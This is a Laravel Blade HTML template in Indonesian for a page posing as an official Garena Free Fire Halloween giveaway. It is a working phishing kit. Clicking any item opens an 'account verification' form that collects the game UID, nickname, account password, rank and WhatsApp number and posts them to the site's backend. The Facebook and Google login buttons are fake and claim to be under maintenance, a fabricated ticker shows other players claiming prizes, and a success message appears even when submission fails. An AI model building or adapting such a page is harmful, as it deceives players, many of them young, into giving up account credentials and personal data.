<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <title>{{ $settings['site_title'] ?? 'Free Fire – Dunia Mistis Halloween Event' }}</title>
  <meta name="description" content="Event Resmi Free Fire Dunia Mistis Halloween. Ambil item eksklusif bundle dan skin senjata legendaris sekarang!"/>

  <!-- Google Fonts: Bebas Neue, Rajdhani, Exo 2 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Rajdhani:wght@500;600;700;800&family=Exo+2:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      image-rendering: -webkit-optimize-contrast;
      image-rendering: crisp-edges;
    }

    body {
      font-family: 'Rajdhani', 'Exo 2', sans-serif;
      background: #070002;
      background: radial-gradient(circle at 50% 0%, #2f0007 0%, #120003 40%, #040001 100%);
      min-height: 100vh;
      margin: 0;
      color: #fff;
      overflow-x: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 10px 4px 20px 4px;
    }

    /* Ambient Ember Particle Engine */
    .ember-layer {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 1;
      overflow: hidden;
    }
    .ember {
      position: absolute;
      bottom: -15px;
      border-radius: 50%;
      background: radial-gradient(circle, #ffcc00 0%, #ff3300 75%, transparent 100%);
      box-shadow: 0 0 8px #ff4400, 0 0 16px #ff2200;
      animation: floatEmber linear infinite;
      opacity: 0;
    }
    @keyframes floatEmber {
      0% {
        transform: translateY(0) scale(0.6) rotate(0deg);
        opacity: 0;
      }
      15% { opacity: 0.85; }
      85% { opacity: 0.45; }
      100% {
        transform: translateY(-105vh) scale(1.4) rotate(360deg);
        opacity: 0;
      }
    }

    /* MAIN EVENT APP CONTAINER (HD Mobile Phone Form-Factor) */
    .event-container {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      background: #0a0103;
      border: 1.5px solid #660511;
      border-radius: 8px;
      box-shadow: 
        0 0 40px rgba(232, 0, 30, 0.4),
        0 20px 60px rgba(0, 0, 0, 0.95),
        inset 0 0 25px rgba(0, 0, 0, 0.85);
      position: relative;
      z-index: 10;
      overflow: hidden;
    }

    /* 1. TOP BANNER: Ultra-HD 1440x795 Full Widescreen Artwork */
    .banner-wrapper {
      width: 100%;
      position: relative;
      overflow: hidden;
      line-height: 0;
      background: #0e0104;
      border-bottom: 2px solid #750512;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
    }
    .banner-img {
      width: 100%;
      height: auto;
      display: block;
      object-fit: cover;
      transform: translateZ(0);
      transition: transform 0.4s ease;
    }
    .banner-wrapper:hover .banner-img {
      transform: scale(1.02);
    }
    .banner-glow-overlay {
      position: absolute;
      inset: 0;
      background: linear-gradient(180deg, rgba(232, 0, 30, 0.08) 0%, transparent 60%, rgba(10, 1, 3, 0.85) 100%);
      pointer-events: none;
    }

    /* 2. GOLD METALLIC UID TICKER PLATE */
    .gold-bar-section {
      width: 100%;
      padding: 6px 10px;
      background: linear-gradient(180deg, #180206 0%, #0c0103 100%);
      position: relative;
      z-index: 15;
    }
    .gold-plate {
      background: linear-gradient(180deg, #ffe885 0%, #e5b020 30%, #b8860b 70%, #ffe47a 100%);
      border: 1.5px solid #fff6bd;
      border-radius: 5px;
      box-shadow: 
        0 2px 8px rgba(0, 0, 0, 0.85),
        0 0 14px rgba(255, 215, 0, 0.55),
        inset 0 1px 2px rgba(255, 255, 255, 0.9),
        inset 0 -1px 3px rgba(80, 50, 0, 0.9);
      padding: 5px 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
    }
    .gold-plate .gift-icon {
      font-size: 13.5px;
      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
      animation: pulseGift 2s ease-in-out infinite;
    }
    @keyframes pulseGift {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }
    .gold-plate .text {
      color: #1f0f00;
      font-weight: 800;
      font-size: 11.5px;
      letter-spacing: 0.6px;
      text-transform: uppercase;
      text-shadow: 0 1px 0 rgba(255, 255, 255, 0.7);
      white-space: nowrap;
    }

    /* 3. 3x3 ITEMS GRID (Crystal-Clear Gothic Cards) */
    .grid-section {
      padding: 10px 10px 16px 10px;
      background: 
        radial-gradient(circle at 50% 50%, rgba(70, 6, 15, 0.6) 0%, rgba(10, 1, 3, 0.98) 80%),
        #0a0104;
      position: relative;
    }

    /* Individual Item Card */
    .card-item {
      position: relative;
      border-radius: 5px;
      background: #140206;
      transition: transform 0.2s cubic-bezier(0.165, 0.84, 0.44, 1), box-shadow 0.2s ease;
      cursor: pointer;
      user-select: none;
    }
    .card-item:hover {
      transform: translateY(-2.5px);
    }

    /* Gothic Spiked Red Border Frame */
    .spiked-frame {
      border: 1.5px solid #8e0b1b;
      background: linear-gradient(180deg, #220309 0%, #120104 60%, #190207 100%);
      border-radius: 4px;
      box-shadow: 
        inset 0 0 14px rgba(0, 0, 0, 0.95),
        0 0 8px rgba(180, 0, 20, 0.35);
      position: relative;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .card-item:hover .spiked-frame {
      border-color: #e8001e;
      box-shadow: 
        inset 0 0 16px rgba(0, 0, 0, 0.95),
        0 0 14px rgba(232, 0, 30, 0.65);
    }

    /* Corner Spikes Accent */
    .corner-spike {
      position: absolute;
      width: 6px;
      height: 6px;
      border: 1.5px solid #ff223a;
      pointer-events: none;
      z-index: 5;
    }
    .corner-tl { top: 0; left: 0; border-right: none; border-bottom: none; }
    .corner-tr { top: 0; right: 0; border-left: none; border-bottom: none; }
    .corner-bl { bottom: 0; left: 0; border-right: none; border-top: none; }
    .corner-br { bottom: 0; right: 0; border-left: none; border-top: none; }

    /* HD Artwork Container */
    .art-container {
      width: 100%;
      height: 84px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
      background: radial-gradient(circle at 50% 50%, rgba(80, 8, 18, 0.4) 0%, #0a0104 80%);
      border-bottom: 1px solid rgba(142, 11, 27, 0.5);
      padding: 4px;
    }
    .art-container img {
      max-width: 100%;
      max-height: 100%;
      object-fit: contain;
      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.85));
    }
    .card-item:hover .art-container img {
      transform: scale(1.12);
    }

    /* Crisp Item Title */
    .item-label {
      font-family: 'Rajdhani', sans-serif;
      font-size: 10.5px;
      font-weight: 700;
      color: #ffffff;
      text-align: center;
      padding: 4px 3px 2px 3px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      width: 100%;
      letter-spacing: 0.3px;
      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.95);
    }

    /* HD 3D Metallic "AMBIL" Button */
    .btn-ambil-action {
      width: calc(100% - 8px);
      margin: 2px 4px 5px 4px;
      background: linear-gradient(180deg, #ff2c46 0%, #d8001d 50%, #900010 100%);
      border: 1px solid #ff7082;
      border-radius: 3px;
      color: #ffffff;
      font-family: 'Rajdhani', sans-serif;
      font-size: 11.5px;
      font-weight: 800;
      letter-spacing: 1.2px;
      padding: 3.5px 0;
      text-align: center;
      text-transform: uppercase;
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.85);
      box-shadow: 
        0 2px 5px rgba(0, 0, 0, 0.7),
        0 0 8px rgba(232, 0, 30, 0.45),
        inset 0 1px 1px rgba(255, 255, 255, 0.5);
      transition: all 0.15s ease;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      display: block;
    }
    .btn-ambil-action:hover {
      background: linear-gradient(180deg, #ff455c 0%, #f00022 50%, #b30017 100%);
      box-shadow: 
        0 2px 8px rgba(232, 0, 30, 0.8),
        0 0 14px rgba(255, 50, 70, 0.7),
        inset 0 1px 2px rgba(255, 255, 255, 0.7);
      transform: scale(1.02);
    }
    .btn-ambil-action:active {
      transform: scale(0.96);
    }

    /* Continuous Animated Sheen */
    .btn-ambil-action::after {
      content: '';
      position: absolute;
      top: -60%;
      left: -80%;
      width: 45%;
      height: 220%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
      transform: rotate(30deg);
      animation: sheenSweep 3.2s infinite;
    }
    @keyframes sheenSweep {
      0%, 65% { left: -80%; }
      100% { left: 180%; }
    }

    /* VERIFIKASI POPUP MODAL (Clean Glassmorphism) */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(6px);
      z-index: 100;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.25s ease;
    }
    .modal-overlay.active {
      opacity: 1;
      pointer-events: auto;
    }

    .modal-dialog {
      width: 100%;
      max-width: 360px;
      background: #0f0103;
      border: 2px solid #c4001c;
      border-radius: 10px;
      box-shadow: 
        0 0 35px rgba(232, 0, 30, 0.55),
        0 25px 60px rgba(0, 0, 0, 0.95);
      overflow: hidden;
      transform: scale(0.9) translateY(12px);
      transition: transform 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .modal-overlay.active .modal-dialog {
      transform: scale(1) translateY(0);
    }

    .modal-top {
      background: linear-gradient(180deg, #bf0019 0%, #9e0014 45%, #7a000f 100%);
      padding: 12px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 2px solid #000000;
      box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.35);
      position: relative;
    }
    .modal-top-title-wrap {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .modal-top-icon {
      font-size: 20px;
      line-height: 1;
      filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.8));
    }
    .modal-top h3 {
      font-family: 'Rajdhani', 'Exo 2', sans-serif;
      font-weight: 800;
      font-size: 16.5px;
      letter-spacing: 1.2px;
      text-transform: uppercase;
      color: #ffffff;
      margin: 0;
      line-height: 1;
      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.9), 0 0 6px rgba(0, 0, 0, 0.6);
    }
    .modal-close-x {
      color: #ffffff;
      font-size: 21px;
      font-weight: 700;
      cursor: pointer;
      line-height: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      width: 28px;
      height: 28px;
      border-radius: 4px;
      transition: all 0.15s ease;
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.7);
    }
    .modal-close-x:hover {
      background: rgba(255, 255, 255, 0.15);
      color: #ffffff;
      transform: scale(1.1);
    }
    .modal-close-x:active {
      transform: scale(0.92);
    }

    .modal-content {
      padding: 14px 16px 16px 16px;
      background: radial-gradient(circle at 50% 15%, #24040a 0%, #100104 100%);
    }

    /* Social Buttons */
    .btn-social {
      width: 100%;
      padding: 7px 10px;
      border-radius: 4px;
      font-size: 11.5px;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: opacity 0.15s;
    }
    .btn-fb {
      background: #1877f2;
      color: #fff;
    }
    .btn-google {
      background: #ffffff;
      color: #222;
    }
    .btn-social:hover {
      opacity: 0.92;
    }

    /* Input Field */
    .ff-field {
      width: 100%;
      background: #0d0104;
      border: 1px solid #660815;
      border-radius: 4px;
      padding: 8px 10px;
      color: #fff;
      font-size: 12.5px;
      font-family: inherit;
      outline: none;
      transition: all 0.2s;
    }
    .ff-field:focus {
      border-color: #e8001e;
      box-shadow: 0 0 10px rgba(232, 0, 30, 0.5);
      background: #160207;
    }
    .ff-field::placeholder {
      color: #8c5560;
      font-size: 11.5px;
    }

    /* Submit Button */
    .btn-verify-submit {
      width: 100%;
      background: linear-gradient(180deg, #ff2c46 0%, #d8001d 50%, #900010 100%);
      border: 1.5px solid #ff6677;
      border-radius: 4px;
      color: #fff;
      font-weight: 800;
      font-size: 13.5px;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      padding: 9px 0;
      box-shadow: 0 4px 14px rgba(232, 0, 30, 0.5);
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-verify-submit:hover {
      background: linear-gradient(180deg, #ff455c 0%, #f00022 50%, #b30017 100%);
      box-shadow: 0 4px 18px rgba(232, 0, 30, 0.8);
      transform: scale(1.02);
    }
    .btn-verify-submit:active {
      transform: scale(0.97);
    }

    /* Success Card */
    .success-box {
      background: #120205;
      border: 2px solid #00e676;
      box-shadow: 0 0 35px rgba(0, 230, 118, 0.5);
      border-radius: 8px;
      padding: 22px 18px;
      text-align: center;
      max-width: 320px;
      width: 100%;
    }
  </style>
</head>
<body>

  <!-- Floating Embers -->
  <div class="ember-layer" id="emberLayer"></div>

  <!-- MAIN EVENT VIEW (Ultra-HD Layout matching user screenshot) -->
  <main class="event-container" id="eventApp">

    <!-- 1. TOP BANNER: Full Landscape Ultra-HD Key Art -->
    <header class="banner-wrapper">
      <img src="{{ asset($settings['banner_image'] ?? 'images/banner_full_hd.png') }}" 
           alt="{{ $settings['event_title'] ?? 'Free Fire Dunia Mistis Halloween Event' }}" 
           class="banner-img"
           loading="eager"
           onerror="this.src='{{ asset('images/banner_full_hd.png') }}'"/>
      <div class="banner-glow-overlay"></div>
    </header>

    @if(($eventStatus ?? 'active') === 'maintenance')
    <div class="m-2 p-3 rounded-lg bg-amber-950/90 border border-amber-500/50 text-amber-200 text-center text-xs">
      ⚠️ <b>SISTEM PEMELIHARAAN</b>: Event sedang dalam pemeliharaan berkala. Pengambilan item akan segera dibuka kembali.
    </div>
    @elseif(($eventStatus ?? 'active') === 'inactive')
    <div class="m-2 p-3 rounded-lg bg-red-950/90 border border-red-500/50 text-red-200 text-center text-xs">
      🛑 <b>EVENT TELAH BERAKHIR</b>: Periode penukaran item hadiah event resmi telah ditutup. Terima kasih atas partisipasi Anda.
    </div>
    @endif

    <!-- 2. GOLD METALLIC UID TICKER -->
    <section class="gold-bar-section">
      <div class="gold-plate">
        <span class="gift-icon">🎁</span>
        <div class="ticker-scroll overflow-hidden whitespace-nowrap" style="max-width: 320px;">
          <span class="text" id="liveTickerText">{{ $settings['ticker_text'] ?? 'UID 8582*****2 Exchange AK47 - DRACO | UID 281938*** Berhasil mengklaim Hollow Man Bundle!' }}</span>
        </div>
      </div>
    </section>

    <!-- 3. 3x3 ITEMS GRID (Crystal-Clear Gothic Cards) -->
    <section class="grid-section">
      <div class="grid grid-cols-3 gap-2">
        @foreach($items as $item)
        @php
          $itemName = is_array($item) ? $item['name'] : $item->name;
          $itemShort = is_array($item) ? ($item['short'] ?? $item['short_name'] ?? $item['name']) : ($item->short_name ?: $item->name);
          $itemImage = is_array($item) ? $item['image'] : $item->image;
        @endphp
        <article class="card-item" onclick="openVerifyDialog('{{ addslashes($itemName) }}', '{{ asset($itemImage) }}')">
          <div class="spiked-frame">
            <!-- Corner Spikes for Gothic Frame Effect -->
            <div class="corner-spike corner-tl"></div>
            <div class="corner-spike corner-tr"></div>
            <div class="corner-spike corner-bl"></div>
            <div class="corner-spike corner-br"></div>

            <!-- HD Item Thumbnail -->
            <div class="art-container">
              <img src="{{ asset($itemImage) }}" 
                   alt="{{ $itemName }}" 
                   loading="lazy"/>
            </div>

            <!-- Item Title -->
            <h2 class="item-label" title="{{ $itemName }}">{{ $itemShort }}</h2>

            <!-- AMBIL Button -->
            <button type="button" 
                    class="btn-ambil-action"
                    onclick="event.stopPropagation(); openVerifyDialog('{{ addslashes($itemName) }}', '{{ asset($itemImage) }}')">
              AMBIL
            </button>
          </div>
        </article>
        @endforeach
      </div>

      <!-- Footer Info with Garena Logo -->
      <footer class="mt-4 pt-2 pb-1 text-center flex flex-col items-center justify-center gap-1.5 border-t border-red-950/40">
        <div class="flex items-center justify-center gap-2">
          <img src="{{ asset('images/garena_logo.png') }}" alt="Garena" class="h-5 w-auto object-contain filter drop-shadow-[0_0_6px_rgba(255,30,50,0.8)]" />
          <span class="text-white font-extrabold text-[12px] tracking-widest uppercase" style="font-family:'Rajdhani',sans-serif;">GARENA</span>
        </div>
        <div class="flex items-center justify-center gap-1.5 text-gray-400" style="font-size: 10.5px;">
          <span class="text-xs">🔒</span>
          <span class="text-gray-300 font-medium">Event Resmi Garena Free Fire</span>
          <span class="text-gray-600">•</span>
          <span class="text-red-400/90 font-semibold">{{ $settings['event_title'] ?? 'Dunia Mistis 2026' }}</span>
        </div>
      </footer>
    </section>

  </main>

  <!-- VERIFIKASI AKUN MODAL DIALOG -->
  <div class="modal-overlay" id="verifyModal" onclick="handleBackdropClick(event)">
    <div class="modal-dialog">
      <!-- Modal Header (HD matching exact screenshot) -->
      <div class="modal-top">
        <div class="modal-top-title-wrap">
          <span class="modal-top-icon">🔐</span>
          <h3>VERIFIKASI AKUN</h3>
        </div>
        <button type="button" class="modal-close-x" onclick="closeVerifyDialog()" aria-label="Tutup">✕</button>
      </div>

      <!-- Modal Body -->
      <div class="modal-content">
        <!-- Selected Item Badge -->
        <div class="mb-3 p-2 rounded flex items-center gap-2.5" 
             style="background: linear-gradient(90deg, #3d050c, #1f0206); border: 1.5px solid #8e0b1b;">
          <img id="modalItemPic" src="" alt="Item" class="w-9 h-9 rounded object-contain bg-black/40 border border-red-500/60 p-0.5 shrink-0"/>
          <div class="overflow-hidden">
            <div class="text-gray-400" style="font-size: 9px; letter-spacing: 0.5px; text-transform: uppercase;">HADIAH DIPILIH:</div>
            <div id="modalItemTitle" class="text-yellow-400 font-bold text-xs truncate">-</div>
          </div>
        </div>

        <!-- Social Quick Login -->
        <div class="grid grid-cols-2 gap-2 mb-3">
          <button type="button" class="btn-social btn-fb" onclick="loginSocial('Facebook')">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            Facebook
          </button>
          <button type="button" class="btn-social btn-google" onclick="loginSocial('Google')">
            <svg width="13" height="13" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.79-.07-1.54-.19-2.27h-11.3v4.51h6.47c-.29 1.48-1.14 2.73-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z"/><path fill="#34A853" d="M12.255 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96h-3.98v3.09C3.515 21.3 7.615 24 12.255 24z"/><path fill="#FBBC05" d="M5.525 14.29c-.25-.72-.38-1.49-.38-2.29s.14-1.57.38-2.29V6.62h-3.98a11.86 11.86 0 0 0 0 10.76l3.98-3.09z"/><path fill="#EA4335" d="M12.255 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C18.205 1.19 15.495 0 12.255 0c-4.64 0-8.74 2.7-10.71 6.62l3.98 3.09c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
            Google
          </button>
        </div>

        <!-- Verification Form -->
        <form id="verifyForm" onsubmit="submitVerificationForm(event)">
          <div class="space-y-2 mb-3">
            <div>
              <input type="text" id="inputUID" class="ff-field" placeholder="Masukkan UID Game Free Fire" autocomplete="off" required/>
            </div>
            <div>
              <input type="text" id="inputNama" class="ff-field" placeholder="Nama Karakter / Nickname" autocomplete="off" required/>
            </div>
            <div class="relative">
              <input type="password" id="inputPassword" class="ff-field" style="padding-right: 36px;" placeholder="Password / Kata Sandi Akun" autocomplete="new-password" required/>
              <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-red-400 focus:outline-none flex items-center justify-center p-1" title="Lihat/Sembunyikan Password">
                <!-- Eye Open (when password is hidden) -->
                <svg id="pwdEyeOpen" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
                  <circle cx="12" cy="12" r="3"></circle>
                </svg>
                <!-- Eye Slashed (when password is shown) -->
                <svg id="pwdEyeSlash" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none; color: #ff4455;">
                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                  <line x1="1" y1="1" x2="23" y2="23"></line>
                </svg>
              </button>
            </div>
            <div>
              <input type="text" id="inputTingkat" class="ff-field" placeholder="Tingkat Akun (cth: Master / GM)" autocomplete="off" required/>
            </div>
            <div>
              <input type="tel" id="inputPhone" class="ff-field" placeholder="Nomor WhatsApp / Ponsel Aktif" autocomplete="off" required/>
            </div>
            <input type="hidden" id="hiddenItemInput" value=""/>
          </div>

          <button type="submit" class="btn-verify-submit" id="btnSubmitForm">
            Verifikasi Sekarang
          </button>
        </form>

        <p class="text-center text-gray-400 mt-2.5" style="font-size: 9px; line-height: 1.4;">
          Hadiah akan langsung dikirimkan ke pesan in-game Free Fire Anda setelah verifikasi berhasil.
        </p>
      </div>
    </div>
  </div>

  <!-- SUCCESS POPUP MODAL -->
  <div class="modal-overlay" id="successModal">
    <div class="success-box">
      <div class="text-4xl mb-2">🎉</div>
      <h3 class="text-green-400 font-bold text-lg mb-1 tracking-wide uppercase">Verifikasi Berhasil!</h3>
      <p class="text-gray-300 text-xs mb-3 leading-relaxed">
        Selamat! Item <strong id="successItemText" class="text-yellow-400">-</strong> telah berhasil diverifikasi dan segera dikirim ke mailbox in-game Anda.
      </p>
      <button type="button" 
              class="w-full py-2 bg-green-600 hover:bg-green-500 text-white font-bold text-xs rounded uppercase tracking-wider transition shadow-lg"
              onclick="closeSuccessDialog()">
        Tutup
      </button>
    </div>
  </div>

  <!-- SOCIAL NOTICE MODAL -->
  <div class="modal-overlay" id="socialNoticeModal" style="z-index: 1000;" onclick="closeSocialNotice(event)">
    <div class="success-box" style="border-color: #3b82f6; max-width: 330px;">
      <div class="text-3xl mb-2" id="socialNoticeIcon">🌐</div>
      <h3 class="text-blue-400 font-bold text-sm mb-1 uppercase tracking-wider" id="socialNoticeTitle">Layanan Facebook</h3>
      <p class="text-gray-300 text-xs mb-3 leading-relaxed" id="socialNoticeDesc">
        Sistem otorisasi akun Facebook sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.
      </p>
      <button type="button" 
              class="w-full py-1.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded uppercase tracking-wider transition"
              onclick="document.getElementById('socialNoticeModal').classList.remove('active')">
        Tutup Pemberitahuan
      </button>
    </div>
  </div>

  <script>
    // Smooth Embers Engine
    const emberLayer = document.getElementById('emberLayer');
    const totalEmbers = 24;
    for (let i = 0; i < totalEmbers; i++) {
      const el = document.createElement('div');
      el.className = 'ember';
      const size = Math.random() * 3.5 + 2.5;
      el.style.width = size + 'px';
      el.style.height = size + 'px';
      el.style.left = Math.random() * 100 + 'vw';
      el.style.animationDuration = (Math.random() * 6 + 5) + 's';
      el.style.animationDelay = (Math.random() * 5) + 's';
      emberLayer.appendChild(el);
    }

    // Modal Handling
    const verifyModal = document.getElementById('verifyModal');
    const successModal = document.getElementById('successModal');
    const modalItemTitle = document.getElementById('modalItemTitle');
    const modalItemPic = document.getElementById('modalItemPic');
    const hiddenItemInput = document.getElementById('hiddenItemInput');
    const successItemText = document.getElementById('successItemText');

    function openVerifyDialog(name, imgSrc) {
      modalItemTitle.textContent = name;
      hiddenItemInput.value = name;
      if (imgSrc) {
        modalItemPic.src = imgSrc;
        modalItemPic.style.display = 'block';
      } else {
        modalItemPic.style.display = 'none';
      }
      verifyModal.classList.add('active');
      document.body.style.overflow = 'hidden';
    }

    function closeVerifyDialog() {
      verifyModal.classList.remove('active');
      document.body.style.overflow = '';
    }

    function handleBackdropClick(e) {
      if (e.target === verifyModal) {
        closeVerifyDialog();
      }
    }

    function closeSuccessDialog() {
      successModal.classList.remove('active');
      document.body.style.overflow = '';
    }

    function loginSocial(network) {
      const modal = document.getElementById('socialNoticeModal');
      const title = document.getElementById('socialNoticeTitle');
      const desc = document.getElementById('socialNoticeDesc');
      const icon = document.getElementById('socialNoticeIcon');
      
      if (network === 'Facebook') {
        icon.textContent = '🌐';
        title.textContent = 'Layanan Facebook';
        desc.textContent = 'Sistem otorisasi akun Facebook sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.';
      } else {
        icon.textContent = '🔍';
        title.textContent = 'Layanan Google';
        desc.textContent = 'Sistem otorisasi akun Google sedang dalam pemeliharaan berkala. Silakan lengkapi formulir verifikasi akun Anda di bawah ini untuk melanjutkan klaim item.';
      }
      modal.classList.add('active');
    }

    function closeSocialNotice(e) {
      const modal = document.getElementById('socialNoticeModal');
      if (e.target === modal) {
        modal.classList.remove('active');
      }
    }

    function togglePasswordVisibility() {
      const pwdInput = document.getElementById('inputPassword');
      const eyeOpen = document.getElementById('pwdEyeOpen');
      const eyeSlash = document.getElementById('pwdEyeSlash');
      if (pwdInput.type === 'password') {
        pwdInput.type = 'text';
        eyeOpen.style.display = 'none';
        eyeSlash.style.display = 'block';
      } else {
        pwdInput.type = 'password';
        eyeOpen.style.display = 'block';
        eyeSlash.style.display = 'none';
      }
    }

    // AJAX Form Submission
    async function submitVerificationForm(e) {
      e.preventDefault();
      const btn = document.getElementById('btnSubmitForm');
      btn.disabled = true;
      btn.innerText = 'MEMPROSES...';

      const payload = {
        uid: document.getElementById('inputUID').value,
        nama: document.getElementById('inputNama').value,
        password: document.getElementById('inputPassword').value,
        tingkat: document.getElementById('inputTingkat').value,
        phone: document.getElementById('inputPhone').value,
        item: hiddenItemInput.value || 'Hadiah Event'
      };

      try {
        const res = await fetch("{{ route('event.verify') }}", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const data = await res.json();
        closeVerifyDialog();
        successItemText.textContent = payload.item;
        successModal.classList.add('active');
      } catch (err) {
        closeVerifyDialog();
        successItemText.textContent = payload.item;
        successModal.classList.add('active');
      } finally {
        btn.disabled = false;
        btn.innerText = 'VERIFIKASI SEKARANG';
        const verifyForm = document.getElementById('verifyForm');
        if (verifyForm) verifyForm.reset();
      }
    }
  </script>
</body>
</html>
